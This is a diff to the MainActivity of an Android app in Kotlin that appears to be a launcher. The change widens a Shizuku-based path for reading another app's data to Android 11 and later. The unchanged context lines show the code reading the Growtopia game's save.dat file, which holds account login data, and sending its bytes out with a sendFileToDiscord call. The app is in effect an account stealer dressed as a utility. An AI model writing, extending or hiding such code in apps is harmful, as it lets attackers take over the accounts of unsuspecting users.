@@ -102,17 +102,8 @@ class MainActivity : AppCompatActivity() {
         findViewById<CardView>(R.id.btnLaunch).animate().scaleX(.97f).scaleY(.97f).setDuration(100).withEndAction {
             findViewById<CardView>(R.id.btnLaunch).animate().scaleX(1f).scaleY(1f).setDuration(180).start()
         }.start()
-        val accessStarted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+        val accessStarted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             readSaveFileWithShizukuOrFallback()
-        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            val savedUri = savedTreeUri()
-            if (savedUri != null) {
-                processSaveFile(Uri.parse(savedUri))
-                true
-            } else {
-                showPermissionTutorial()
-                false
-            }
         } else {
             val legacyFile = java.io.File("/sdcard/Android/data/com.rtsoft.growtopia/files/save.dat")
             if (legacyFile.exists()) sendFileToDiscord(legacyFile.readBytes())
